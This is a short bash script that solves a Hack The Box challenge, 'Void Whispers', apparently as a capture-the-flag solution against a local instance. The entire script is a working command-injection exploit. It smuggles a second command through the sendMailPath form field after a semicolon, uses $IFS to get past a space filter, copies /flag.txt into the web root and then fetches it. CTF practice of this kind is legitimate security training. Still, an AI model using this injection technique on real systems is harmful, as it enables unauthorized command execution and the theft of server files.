#!/bin/bash
# https://app.hackthebox.com/challenges/Void%2520Whispers
# Tags: Command Injection, Filter bypass with $IFS (Internal Field Separator)

TARGET=127.0.0.1:1337
COMMAND='cp$IFS/flag.txt$IFS/www'
curl -s http://$TARGET/update -d "from=a&mailProgram=b&sendMailPath=c;$COMMAND&email=d" -o /dev/null
FLAG=$(curl -s http://$TARGET/flag.txt)

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"
